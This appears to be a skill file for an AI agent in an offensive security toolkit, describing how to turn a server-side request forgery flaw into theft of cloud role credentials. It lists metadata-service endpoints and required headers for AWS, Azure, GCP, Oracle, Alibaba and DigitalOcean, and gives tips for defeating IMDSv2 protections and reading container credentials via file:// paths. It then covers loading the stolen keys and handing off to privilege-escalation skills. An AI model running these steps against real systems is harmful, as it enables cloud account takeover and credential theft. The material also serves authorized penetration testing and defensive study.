---
name: metadata-ssrf
description: Cloud metadata (IMDS) credential theft via SSRF. CLD03. Turns an app SSRF into cloud role credentials. Maps to MITRE T1552.005.
allowed-tools: Read, Grep, Glob, Bash
---

# Metadata / SSRF Credential Theft Skill (CLD03)

The highest-impact cloud chain: an application SSRF reaches the instance metadata
service and steals the attached role's temporary credentials → cloud foothold.
Pair with Specter's `ssrf` skill (`specter/.claude/skills/ssrf/SKILL.md` — who finds the
primitive and establishes the response channel) and the IAM skills here (what the stolen
role can do). Playbooks: `ssrf-cloud-metadata` is this lane; `ssrf-fetch-by-url`,
`ssrf-processing-pipeline`, `ssrf-rendering-bot`, `webhook-ssrf-deblind` and
`agent-tool-ssrf` all hand off to it.

## Prerequisites
- An SSRF primitive (from Specter) or a server-side fetch you control, OR direct
  access to a compute instance.

## Methodology

### Step 0: Fingerprint the provider and the runtime
The link-local address is shared by several providers with completely different path
layouts and header rules, and two providers use a different address entirely. Container
and serverless runtimes expose their own credential endpoints separate from the host
metadata service, and those are usually header-free. Establish which you are on before
firing paths. Full table: `nimbus/wordlists/cloud-metadata-endpoints.txt` (60+ endpoints,
annotated with the header each one requires).

### Step 1: Reach the metadata endpoint

**What the SSRF primitive can express decides everything here.** A GET-only primitive
needs a header-free path. A primitive that can set a method and a request header — a
webhook with custom headers, a renderer executing JavaScript, header injection — reaches
everything, including the token handshake.

- **AWS IMDSv1 (header-free):** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  then `/<role>` → returns AccessKeyId/SecretAccessKey/Token.
- **AWS IMDSv2 (token):** `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`,
  then the GET carrying `X-aws-ec2-metadata-token`. See the false-positive traps below before
  writing this off.
- **AWS ECS / Fargate (header-free):** `http://169.254.170.2/v2/credentials/<UUID>`. The UUID
  comes from `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`, readable through `file:///proc/self/environ`
  where the primitive supports `file://`.
- **AWS EKS Pod Identity (header-free):** `http://169.254.170.23/v1/credentials`.
- **AWS Lambda:** `http://127.0.0.1:9001/2018-06-01/runtime/invocation/next`.
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=...` and
  `/metadata/identity/oauth2/token` with header `Metadata: true`.
- **GCP:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
  with header `Metadata-Flavor: Google`. The legacy `v1beta1` paths historically require **no**
  header, which is what a GET-only primitive wants. Appending a JSON format parameter also forces
  a renderable response, which matters when the channel is a screenshot or a PDF.
- **Oracle:** `http://169.254.169.254/opc/v2/instance/` with `Authorization: Bearer Oracle`,
  or the legacy `http://192.0.0.192/latest/`.
- **Alibaba:** `http://100.100.100.200/latest/meta-data/ram/security-credentials/`.
- **DigitalOcean (header-free):** `http://169.254.169.254/metadata/v1.json` returns everything.

### Step 2: Steal + assume
Capture the temporary creds and load them; `aws sts get-caller-identity` (or
equivalent) to confirm they work from your context.

### Step 3: Scope the blast radius
Hand off to `iam-privesc` / `storage-exposure` to enumerate what the role can do.
Use `metadata-probe.sh` to test reachability non-destructively.

## Payloads / wordlists
`nimbus/wordlists/cloud-metadata-endpoints.txt`.

## Validate (negative control)
- **Attack:** the stolen credentials **authenticate** from outside the instance
  (`get-caller-identity` returns the role) — proof the SSRF yielded usable creds.
- **Negative control:** IMDSv2-enforced / blocked metadata returns 401/timeout for
  the same vector; or creds without the SSRF aren't obtainable. Distinguishes a real
  theft from a reachable-but-tokenless IMDSv2.

## Evidence to capture
The SSRF request reaching metadata, the returned (redacted) credential blob, and
the external `get-caller-identity` proving they work.

## False-positive traps
- **Do not record IMDSv2 as a closed lane until the primitive has been tested for method
  and header control.** Reaching the address with a GET-only primitive and getting nothing
  is a *mitigated* state, often Info/Low — but the hop limit only defeats a request
  originating a hop away (a container behind a bridge, a network-layer proxy). An SSRF in
  application code running on the instance is the first hop and is unaffected, and a
  primitive with header control runs the handshake from the workload itself. Closing this
  lane on the GET-only result alone is a confounded negative (hunting Rule 27, and
  feedback-confounded-negative-closes-lanes).
- Creds returned but already expired / role has no permissions. Say so honestly; a
  harvested role with no reach is a real but much smaller finding.
- A WAF/proxy answering, not the real metadata service.
- A metadata concealment proxy in front of the service will return a plausible-looking
  response with the credential fields stripped. Check for the fields, not the status code.

## Validate & Promote

Findings from this skill are born `theoretical` (see the repo-root `CLAUDE.md`). Promote via `scripts/validate-finding.sh` only after the stolen creds authenticate externally. Chain with `--chain-id` to the source SSRF.

**Produce the proof with the harness, then promote from it.** The primitive writes
`$PROJECT_DIR/evidence/<id>/*.json`; `--from-evidence` reads that record and promotes
only if it says `confirmed`, carrying the class, control and method across:

The trailing argument on `verdict` is the **response-channel rung** (hunting Rule 32).
For this skill it should be `credential` only once the stolen credentials actually
authenticate externally; a metadata response you could reach but not read is `partial`,
and a bare callback is `blind`. The evidence gate refuses a critical promotion on
anything below `credential`, so record it honestly rather than to clear the gate.

```bash
# 1. record the class + rung up front so the evidence gate arms itself
bash scripts/finding.sh --project-dir "$PROJECT_DIR" --agent nimbus --severity high \
  --title '<what you proved>' --description '<...>' --impact '<...>' \
  --class imds --channel-rung credential

# 2. produce the proof
python3 scripts/confirm/oob-client.py mint          # 2-hop URL proves allowlist bypass
PROJECT_DIR="$PROJECT_DIR" python3 scripts/confirm/oob-client.py verdict NONCE NIM-NNN imds credential

# 3. promote from the artifact
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent nimbus \
  --id NIM-NNN --from-evidence
```

Promoting by hand below is the fallback for when the harness cannot reach the target.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent nimbus \
  --id NIM-NNN --state confirmed --method manual-repro --method out-of-band \
  --negative-control "SSRF->IMDSv1 creds; sts get-caller-identity returns role X externally; IMDSv2 host returns 401 to same vector" --by nimbus
```
